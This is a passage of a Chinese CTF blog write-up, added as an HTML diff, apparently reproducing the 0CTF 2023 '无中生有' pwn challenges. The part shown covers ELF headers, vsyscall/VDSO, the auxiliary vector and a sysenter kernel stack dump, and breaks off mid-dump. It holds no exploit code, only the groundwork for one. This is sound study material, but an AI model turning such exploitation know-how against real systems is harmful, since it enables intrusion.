@@ -1,0 +1,1003 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="在TCTF决赛被无中生有折磨之后第二天在0CTF再次被暴击，复现来了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 0CTF 无中生有系列">
+<meta property="og:url" content="http://akaieurus.github.io/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="在TCTF决赛被无中生有折磨之后第二天在0CTF再次被暴击，复现来了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc46.jpg">
+<meta property="article:published_time" content="2024-01-21T04:58:43.000Z">
+<meta property="article:modified_time" content="2025-01-03T11:05:14.533Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc46.jpg">
+  
+  
+  
+  <title>2023 0CTF 无中生有系列 - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc46.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023 0CTF 无中生有系列"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-21 12:58" pubdate>
+          2024年1月21日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          46 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2023 0CTF 无中生有系列</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>在TCTF决赛被无中生有折磨之后第二天在0CTF再次被暴击，复现来了</p>
+<span id="more"></span>
+
+<h1 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h1><p>一些链接装载与库的复习</p>
+<h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><p>就是这个玩意</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/elfheader.png" srcset="/img/loading.gif" lazyload class title="elfheader">
+
+<p>EFF header结构体（64位）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>	e_ident[EI_NIDENT];	<span class="hljs-comment">/* Magic number and other info */</span><br>  Elf64_Half	e_type;			<span class="hljs-comment">/* Object file type */</span><br>  Elf64_Half	e_machine;		<span class="hljs-comment">/* Architecture */</span><br>  Elf64_Word	e_version;		<span class="hljs-comment">/* Object file version */</span><br>  Elf64_Addr	e_entry;		<span class="hljs-comment">/* Entry point virtual address */</span><br>  Elf64_Off	e_phoff;		<span class="hljs-comment">/* Program header table file offset */</span><br>  Elf64_Off	e_shoff;		<span class="hljs-comment">/* Section header table file offset */</span><br>  Elf64_Word	e_flags;		<span class="hljs-comment">/* Processor-specific flags */</span><br>  Elf64_Half	e_ehsize;		<span class="hljs-comment">/* ELF header size in bytes */</span><br>  Elf64_Half	e_phentsize;		<span class="hljs-comment">/* Program header table entry size */</span><br>  Elf64_Half	e_phnum;		<span class="hljs-comment">/* Program header table entry count */</span><br>  Elf64_Half	e_shentsize;		<span class="hljs-comment">/* Section header table entry size */</span><br>  Elf64_Half	e_shnum;		<span class="hljs-comment">/* Section header table entry count */</span><br>  Elf64_Half	e_shstrndx;		<span class="hljs-comment">/* Section header string table index */</span><br>&#125; Elf64_Ehdr;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>e_ident：ELF magic number</p>
+</li>
+<li><p>e_type：ELF类型</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_NONE		0		<span class="hljs-comment">/* No file type */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_REL		1		<span class="hljs-comment">/* 可重定位文件（.o文件） */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_EXEC		2		<span class="hljs-comment">/* 可执行文件（静态链接文件） */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_DYN		3		<span class="hljs-comment">/* 动态库文件（动态链接文件和共享库文件） */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_CORE		4		<span class="hljs-comment">/* 核心转储文件（core） */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>	ET_NUM		5		<span class="hljs-comment">/* Number of defined types */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_LOOS		0xfe00		<span class="hljs-comment">/* OS-specific range start */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_HIOS		0xfeff		<span class="hljs-comment">/* OS-specific range end */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_LOPROC	0xff00		<span class="hljs-comment">/* Processor-specific range start */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ET_HIPROC	0xffff		<span class="hljs-comment">/* Processor-specific range end */</span></span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>e_machine：架构（太多了不列了）</p>
+</li>
+<li><p>e_version：ELF版本信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_NONE		0		<span class="hljs-comment">/* Invalid ELF version */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_CURRENT	1		<span class="hljs-comment">/* 一般用这个 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EV_NUM		2</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>e_entry：执行入口地址</p>
+</li>
+<li><p>e_phoff：段表的偏移</p>
+<img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/%E6%AE%B5%E8%A1%A8.png" srcset="/img/loading.gif" lazyload class title="段表">
+</li>
+<li><p>e_shoff：节表的偏移（在ELF尾部）</p>
+</li>
+<li><p>e_flags：处理器标志</p>
+</li>
+<li><p>e_ehsize：ELF header大小</p>
+</li>
+<li><p>e_phentsize：段表每一项的大小</p>
+</li>
+<li><p>e_phnum：段表项数</p>
+</li>
+<li><p>e_shentsize：节表每一项的大小</p>
+</li>
+<li><p>e_shnum：节表项数</p>
+</li>
+<li><p>e_shstrndx：section header string table index</p>
+</li>
+</ul>
+<h2 id="Program-Header-Table"><a href="#Program-Header-Table" class="headerlink" title="Program Header Table"></a>Program Header Table</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Word	p_type;			<span class="hljs-comment">/* Segment type */</span><br>  Elf64_Word	p_flags;		<span class="hljs-comment">/* Segment flags */</span><br>  Elf64_Off	p_offset;		<span class="hljs-comment">/* Segment file offset */</span><br>  Elf64_Addr	p_vaddr;		<span class="hljs-comment">/* Segment virtual address */</span><br>  Elf64_Addr	p_paddr;		<span class="hljs-comment">/* Segment physical address */</span><br>  Elf64_Xword	p_filesz;		<span class="hljs-comment">/* Segment size in file */</span><br>  Elf64_Xword	p_memsz;		<span class="hljs-comment">/* Segment size in memory */</span><br>  Elf64_Xword	p_align;		<span class="hljs-comment">/* Segment alignment */</span><br>&#125; Elf64_Phdr;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>p_type：段类型</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span>	PT_NULL		0		<span class="hljs-comment">/* 未使用 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_LOAD		1		<span class="hljs-comment">/* 可加载段，p_filesz表示段大小，p_memsz表示内存大小 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_DYNAMIC	2		<span class="hljs-comment">/* 动态链接信息 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_INTERP	3		<span class="hljs-comment">/* 解释器路径 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_NOTE		4		<span class="hljs-comment">/* 附加信息的位置和大小 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_SHLIB	5		<span class="hljs-comment">/* 保留 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_PHDR		6		<span class="hljs-comment">/* ELF Header大小位置 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_TLS		7		<span class="hljs-comment">/* Thread-local storage segment */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>	PT_NUM		8		<span class="hljs-comment">/* Number of defined types */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_LOOS		0x60000000	<span class="hljs-comment">/* Start of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_GNU_EH_FRAME	0x6474e550	<span class="hljs-comment">/* GCC .eh_frame_hdr segment */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_GNU_STACK	0x6474e551	<span class="hljs-comment">/* Indicates stack executability */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_GNU_RELRO	0x6474e552	<span class="hljs-comment">/* Read-only after relocation */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_GNU_PROPERTY	0x6474e553	<span class="hljs-comment">/* GNU property */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_LOSUNW	0x6ffffffa</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_SUNWBSS	0x6ffffffa	<span class="hljs-comment">/* Sun Specific segment */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_SUNWSTACK	0x6ffffffb	<span class="hljs-comment">/* Stack segment */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_HISUNW	0x6fffffff</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_HIOS		0x6fffffff	<span class="hljs-comment">/* End of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_LOPROC	0x70000000	<span class="hljs-comment">/* Start of processor-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_HIPROC	0x7fffffff	<span class="hljs-comment">/* End of processor-specific */</span></span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>p_flags：段权限</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_X		(1 &lt;&lt; 0)	<span class="hljs-comment">/* Segment is executable */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_W		(1 &lt;&lt; 1)	<span class="hljs-comment">/* Segment is writable */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_R		(1 &lt;&lt; 2)	<span class="hljs-comment">/* Segment is readable */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_MASKOS	0x0ff00000	<span class="hljs-comment">/* OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_MASKPROC	0xf0000000	<span class="hljs-comment">/* Processor-specific */</span></span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>p_vaddr：段虚拟地址</p>
+</li>
+<li><p>p_paddr：段物理地址</p>
+</li>
+<li><p>p_filesz：文件镜像中段大小</p>
+</li>
+<li><p>p_memsz：内存镜像中段大小</p>
+</li>
+<li><p>p_align：对齐相关信息</p>
+</li>
+</ul>
+<h2 id="VDSO"><a href="#VDSO" class="headerlink" title="VDSO"></a>VDSO</h2><p>x86-32使用 <strong>int 0x80</strong> 系统调用，但执行速度很慢，为了加快速度</p>
+<ul>
+<li><strong>Intel</strong>先实现了快速系统调用指令 <strong>sysenter</strong> 和 <strong>sysexit</strong></li>
+<li><strong>AMD</strong>后实现了快速系统调用指令 <strong>syscall</strong> 和 <strong>sysret</strong></li>
+</ul>
+<p>x86-64统一使用 <strong>syscall</strong> 和 <strong>sysret</strong>，Intel同时支持两种方式</p>
+<ul>
+<li><p>厂商芯片斗争的结果就是不同的芯片需要使用不同的快速系统调用指令，因此开发了 <strong>vsyscall</strong> 机制，即glibc通过调用 <strong>__kernel_vsyscall</strong> 来确定到底应该执行什么指令</p>
+<p><strong>__kernel_vsyscall</strong> 是一个特殊的页，位于内核地址空间（唯一允许用户访问的内核空间），该区域的地址固定为0xffffffffff600000（64位）</p>
+</li>
+<li><p><strong>vsyscall</strong> 还有一个重要的作用就是加快某些系统调用的速度</p>
+<p>比如有些系统调用只需要读取一些数据进行计算，可以定期将这些数据推送到内核和用户空间的共享内存中，再利用 <strong>__kernel_vsyscall</strong> 读取计算，相当于将系统调用变成了函数调用，提高效率效果显著</p>
+</li>
+</ul>
+<p>但 <strong>vsyscall</strong> 存在一些问题</p>
+<ul>
+<li>地址固定，容易成为ret2libc的跳板</li>
+<li>支持的系统调用有限，且不易扩展</li>
+</ul>
+<p>所以有了 <strong>VDSO</strong></p>
+<ul>
+<li><strong>VDSO</strong> 本质上是一个ELF共享目标文件；而 <strong>vsyscall</strong> 只是一段内存代码和数据。</li>
+<li><strong>vsyscall</strong> 位于内核地址空间，采用静态地址映射方式；而 <strong>VDSO</strong> 借助共享目标文件天生具有的PIC特性，可以以进程为粒度动态映射到进程地址空间中</li>
+</ul>
+<h2 id="Auxiliary-Vector"><a href="#Auxiliary-Vector" class="headerlink" title="Auxiliary Vector"></a>Auxiliary Vector</h2><p>辅助信息数组，用来在ld初始工作，没有完善的运行环境时，提供一些提示性的信息，在栈上（envp之后）</p>
+<p>相关结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint64_t</span> a_type;		<span class="hljs-comment">/* Entry type */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>      <span class="hljs-type">uint64_t</span> a_val;		<span class="hljs-comment">/* Integer value */</span><br>      <span class="hljs-comment">/* We use to have pointer elements added here.  We cannot do that,</span><br><span class="hljs-comment">	 though, since it does not work when using 32-bit definitions</span><br><span class="hljs-comment">	 on 64-bit platforms and vice versa.  */</span><br>    &#125; a_un;<br>&#125; Elf64_auxv_t;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_NULL		0		<span class="hljs-comment">/* End of vector */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_IGNORE	1		<span class="hljs-comment">/* Entry should be ignored */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_EXECFD	2		<span class="hljs-comment">/* ld可能利用操作系统的读写功能访问ELF，这是ELF的fd */</span></span><br>						   <span class="hljs-comment">/* ld也可能直接将ELF映射进内存，这时候为了提供空间就需要以下几项 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_PHDR		3		<span class="hljs-comment">/* Program Header Table的地址 */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_PHENT	4		<span class="hljs-comment">/* Size of program header entry */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_PHNUM	5		<span class="hljs-comment">/* Number of program headers */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_PAGESZ	6		<span class="hljs-comment">/* System page size */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_BASE		7		<span class="hljs-comment">/* Base address of interpreter */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_FLAGS	8		<span class="hljs-comment">/* Flags */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_ENTRY	9		<span class="hljs-comment">/* Entry point of program */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_NOTELF	10		<span class="hljs-comment">/* Program is not ELF */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_UID		11		<span class="hljs-comment">/* Real uid */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_EUID		12		<span class="hljs-comment">/* Effective uid */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_GID		13		<span class="hljs-comment">/* Real gid */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_EGID		14		<span class="hljs-comment">/* Effective gid */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AT_CLKTCK	17		<span class="hljs-comment">/* Frequency of times() */</span></span><br></code></pre></td></tr></table></figure>
+
+<h2 id="sysenter"><a href="#sysenter" class="headerlink" title="sysenter"></a>sysenter</h2><p><em>qemu调sysenter选一个Intel的cpu就行了，比如Broadwell-v1</em></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 -cpu help<br></code></pre></td></tr></table></figure>
+
+<p>解释一下为什么sysenter返回之后程序回跑飞</p>
+<ul>
+<li><p>在一系列处理之后会调用do_SYSENTER_32正式处理sysenter，在这之前的pt_regs</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rdi rsp <span class="hljs-number">0xffffc90000463f58</span> ◂— <span class="hljs-number">0x1</span>					r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│         <span class="hljs-number">0xffffc90000463f60</span> —▸ <span class="hljs-number">0x4c17d0</span>				r14<br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│         <span class="hljs-number">0xffffc90000463f68</span> —▸ <span class="hljs-number">0x7ffe7a28fff8</span>		 r13<br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│         <span class="hljs-number">0xffffc90000463f70</span> ◂— <span class="hljs-number">0x1</span>					r12<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│         <span class="hljs-number">0xffffc90000463f78</span> —▸ <span class="hljs-number">0x7ffe7a28fe10</span>		 bp<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│         <span class="hljs-number">0xffffc90000463f80</span> ◂— <span class="hljs-number">0x2c</span>					bx<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│         <span class="hljs-number">0xffffc90000463f88</span> ◂— <span class="hljs-number">0x206</span>				r11<br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│         <span class="hljs-number">0xffffc90000463f90</span> ◂— <span class="hljs-number">0x80</span>					r10<br><span class="hljs-number">08</span>:<span class="hljs-number">0040</span>│         <span class="hljs-number">0xffffc90000463f98</span> ◂— <span class="hljs-number">0x800000000000</span>		 r9<br><span class="hljs-number">09</span>:<span class="hljs-number">0048</span>│         <span class="hljs-number">0xffffc90000463fa0</span> —▸ <span class="hljs-number">0x4c7d70</span>				 r8<br><span class="hljs-number">0</span>a:<span class="hljs-number">0050</span>│         <span class="hljs-number">0xffffc90000463fa8</span> ◂— <span class="hljs-number">0xffffffffffffffda</span>	  ax<br><span class="hljs-number">0b</span>:<span class="hljs-number">0058</span>│         <span class="hljs-number">0xffffc90000463fb0</span> ◂— <span class="hljs-number">0xa</span>					cx<br><span class="hljs-number">0</span>c:<span class="hljs-number">0060</span>│         <span class="hljs-number">0xffffc90000463fb8</span> —▸ <span class="hljs-number">0x7ffe7a290008</span>		 dx<br><span class="hljs-number">0</span>d:<span class="hljs-number">0068</span>│         <span class="hljs-number">0xffffc90000463fc0</span> —▸ <span class="hljs-number">0x7ffe7a28fff8</span>		 si<br><span class="hljs-number">0</span>e:<span class="hljs-number">0070</span>│         <span class="hljs-number">0xffffc90000463fc8</span> ◂— <span class="hljs-number">0x1</span>					di<br><span class="hljs-number">0f</span>:<span class="hljs-number">0078</span>│         <span class="hljs-number">0xffffc90000463fd0</span> ◂— <span 